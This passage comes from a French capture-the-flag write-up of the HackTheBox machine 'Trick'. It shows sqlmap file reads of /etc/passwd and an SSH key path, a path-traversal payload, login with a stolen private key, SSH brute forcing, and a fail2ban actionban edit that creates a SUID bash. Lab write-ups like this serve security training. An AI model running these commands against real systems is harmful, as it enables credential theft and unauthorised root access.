+</span></span><span class="line"><span class="cl"><span class="c1">#       # imap_capabilities &#34;IMAP4rev1&#34; &#34;UIDPLUS&#34;;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       server {</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               listen     localhost:110;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               protocol   pop3;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               proxy      on;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       }</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       server {</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               listen     localhost:143;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               protocol   imap;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               proxy      on;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#       }</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#}</span></span></span></code></pre></div></div>
+<p>Je regarde le fichier de configuration de <code>nginx</code> qui est le <code>/etc/nginx/sites-enabled/default</code>. J&rsquo;y découvre la configuration des domaines et sous-domaines déjà recensés mais aussi d&rsquo;un nouveau sous-domaine : <code>preprod-marketing.trick.htb</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> -file-read<span class="o">=</span>/etc/nginx/sites-enabled/default
+</span></span><span class="line"><span class="cl">-SNIP--
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:22:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local</span> file <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default&#39;</span> and the remote file <span class="s1">&#39;/etc/nginx/sites-enabled/default&#39;</span> have the same size <span class="o">(</span><span class="m">1058</span> B<span class="o">)</span>
+</span></span><span class="line"><span class="cl">files saved to <span class="o">[</span>1<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default <span class="o">(</span>same file<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:22:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:22:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 20:22:04 /2025-10-01/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+</span></span><span class="line"><span class="cl">server <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        listen <span class="m">80</span> default_server<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        listen <span class="o">[</span>::<span class="o">]</span>:80 default_server<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        server_name trick.htb<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        root /var/www/html<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        index index.html index.htm index.nginx-debian.html<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        server_name _<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location / <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ <span class="o">=</span>404<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location ~ <span class="se">\.</span>php$ <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                include snippets/fastcgi-php.conf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">                fastcgi_pass unix:/run/php/php7.3-fpm.sock<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">server <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        listen 80<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        listen <span class="o">[</span>::<span class="o">]</span>:80<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        server_name preprod-marketing.trick.htb<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        root /var/www/market<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        index index.php<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location / <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ <span class="o">=</span>404<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location ~ <span class="se">\.</span>php$ <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                include snippets/fastcgi-php.conf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">server <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        listen 80<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        listen <span class="o">[</span>::<span class="o">]</span>:80<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        server_name preprod-payroll.trick.htb<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        root /var/www/payroll<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        index index.php<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location / <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ <span class="o">=</span>404<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location ~ <span class="se">\.</span>php$ <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                include snippets/fastcgi-php.conf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">                fastcgi_pass unix:/run/php/php7.3-fpm.sock<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div></div>
+<p>Il y a un utilisateur <code>Micheal</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> -file-read<span class="o">=</span>/etc/passwd
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:27:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: <span class="s1">&#39;2351&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:27:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local</span> file <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd&#39;</span> and the remote file <span class="s1">&#39;/etc/passwd&#39;</span> have the same size <span class="o">(</span><span class="m">2351</span> B<span class="o">)</span>
+</span></span><span class="line"><span class="cl">files saved to <span class="o">[</span>1<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd <span class="o">(</span>same file<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:27:30<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:27:30<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 20:27:30 /2025-10-01/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class="line"><span class="cl">dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+</span></span><span class="line"><span class="cl">avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+</span></span><span class="line"><span class="cl">Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">michael:x:1001:1001::/home/michael:/bin/bash</span></span></code></pre></div></div>
+<p>Je ne pas lire le contenu des fichiers du répertoire <code>/home/michael</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  sqlmap -r trick.req --batch --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> -file-read<span class="o">=</span>/home/michael/.ssh/id_rsa
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:29:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching file: <span class="s1">&#39;/home/michael/.ssh/id_rsa&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:29:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> retrieved: <span class="s1">&#39; &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:29:07<span class="o">]</span> <span class="o">[</span>ERROR<span class="o">]</span> no data retrieved
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:29:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetched data logged to text files under <span class="s1">&#39;/root/.local/share/sqlmap/output/preprod-payroll.trick.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>20:29:07<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> your sqlmap version is outdated
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 20:29:07 /2025-10-01/</span></span></code></pre></div></div>
+<h3 id="lfi">LFI</h3>
+<p>Il s&rsquo;agit d&rsquo;un site de Business.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-15.png"
+        data-srcset="/images/Trick/Trick-15.png, /images/Trick/Trick-15.png 1.5x, /images/Trick/Trick-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-15.png"
+        title="/images/Trick/Trick-15.png" width="1920" height="963" /></p>
+<p>En cliquant sur les onglets, je vois quelque chose d’intéressant sur l&rsquo;URL de la page.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-16.png"
+        data-srcset="/images/Trick/Trick-16.png, /images/Trick/Trick-16.png 1.5x, /images/Trick/Trick-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-16.png"
+        title="/images/Trick/Trick-16.png" width="632" height="132" /></p>
+<p>Il y a une LFI sur le paramètre <code>page</code> en utilisant le payload <code>....//....//....//etc/passwd</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-17.png"
+        data-srcset="/images/Trick/Trick-17.png, /images/Trick/Trick-17.png 1.5x, /images/Trick/Trick-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-17.png"
+        title="/images/Trick/Trick-17.png" width="1920" height="318" /></p>
+<p>Je récupère la clé privée de <code>michael</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-18.png"
+        data-srcset="/images/Trick/Trick-18.png, /images/Trick/Trick-18.png 1.5x, /images/Trick/Trick-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-18.png"
+        title="/images/Trick/Trick-18.png" width="1920" height="339" /></p>
+<p>Je copie la clé depuis le code source pour qu&rsquo;elle soit dans le bon format.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-19.png"
+        data-srcset="/images/Trick/Trick-19.png, /images/Trick/Trick-19.png 1.5x, /images/Trick/Trick-19.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-19.png"
+        title="/images/Trick/Trick-19.png" width="1130" height="509" /></p>
+<h3 id="ssh">SSH</h3>
+<p>Puis je me connecte par SSH avec cette clé.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  chmod <span class="m">600</span> michael.key
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  ssh -i michael.key michael@trick.htb
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;trick.htb (10.129.104.218)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>trick.htb<span class="err">&#39;</span> <span class="o">(</span>ED25519<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">Linux trick 4.19.0-20-amd64 <span class="c1">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">michael@trick:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+</span></span><span class="line"><span class="cl">michael@trick:~$ cat user.txt
+</span></span><span class="line"><span class="cl">ed29*******************************</span></span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="fail2ban">Fail2ban</h3>
+<p>Michael est membre du groupe <code>security</code>. Il peut aussi redémarrer le service <code>fail2ban</code> en tant que root.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">michael@trick:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
+</span></span><span class="line"><span class="cl">michael@trick:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> michael on trick:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User michael may run the following commands on trick:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/fail2ban restart</span></span></code></pre></div></div>
+<p>Cet article de <a href="https://juggernaut-sec.com/fail2ban-lpe/" target="_blank" rel="noopener noreffer ">Juggernaut-sec</a> explique très bien comment effectuer une escalade de privilèges avec <code>fail2ban</code> sur une machine Linux.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">michael@trick:~$ cat /etc/fail2ban/jail.conf
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl"><span class="c1"># &#34;bantime&#34; is the number of seconds that a host is banned.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">bantime</span>  <span class="o">=</span> 10s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># A host is banned if it has generated &#34;maxretry&#34; during the last &#34;findtime&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># seconds.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">findtime</span>  <span class="o">=</span> 10s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># &#34;maxretry&#34; is the number of failures before a host get banned.</span>
+</span></span><span class="line"><span class="cl"><span class="nv">maxretry</span> <span class="o">=</span> <span class="m">5</span></span></span></code></pre></div></div>
+<p>Le répertoire <code>/etc/fail2ban/action.d</code> est accessible en écriture et en lecture par l&rsquo;utilisateur <code>root</code> ainsi que les membres du groupe <code>security</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">michael@trick:~$ ls -la /etc/fail2ban/
+</span></span><span class="line"><span class="cl">total <span class="m">76</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">6</span> root root      <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">126</span> root root     <span class="m">12288</span> Oct  <span class="m">1</span> 20:33 ..
+</span></span><span class="line"><span class="cl">drwxrwx---   <span class="m">2</span> root security  <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 action.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root      <span class="m">2334</span> Oct  <span class="m">1</span> 20:54 fail2ban.conf
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root      <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 fail2ban.d
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">3</span> root root      <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 filter.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root     <span class="m">22908</span> Oct  <span class="m">1</span> 20:54 jail.conf
+</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">2</span> root root      <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 jail.d
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">645</span> Oct  <span class="m">1</span> 20:54 paths-arch.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root      <span class="m">2827</span> Oct  <span class="m">1</span> 20:54 paths-common.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">573</span> Oct  <span class="m">1</span> 20:54 paths-debian.conf
+</span></span><span class="line"><span class="cl">-rw-r--r--   <span class="m">1</span> root root       <span class="m">738</span> Oct  <span class="m">1</span> 20:54 paths-opensuse.conf
+</span></span><span class="line"><span class="cl">michael@trick:~$ ls -la /etc/fail2ban/action.d/
+</span></span><span class="line"><span class="cl">total <span class="m">288</span>
+</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">2</span> root security  <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> root root      <span class="m">4096</span> Oct  <span class="m">1</span> 20:54 ..
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root      <span class="m">1420</span> Oct  <span class="m">1</span> 20:54 iptables-multiport.conf</span></span></code></pre></div></div>
+<p>Je modifie alors le fichier  <code>/etc/fail2ban/action.d/iptables-multiport.conf</code> pour y ajouter au paramètre <code>actionban</code> l&rsquo;action que je veux qu&rsquo;il fasse. Ici je fais une copie du <code>/bin/bash</code> et lui donne tous les privilèges ainsi que le bit <code>SUID</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-21.png"
+        data-srcset="/images/Trick/Trick-21.png, /images/Trick/Trick-21.png 1.5x, /images/Trick/Trick-21.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-21.png"
+        title="/images/Trick/Trick-21.png" width="1103" height="219" /></p>
+<p>Ensuite, je brute force le SSH. Je remarque alors que je ne suis pas banni.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  nxc ssh trick.htb -u root -p /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
+</span></span><span class="line"><span class="cl">SSH         10.129.104.218  <span class="m">22</span>     trick.htb        <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
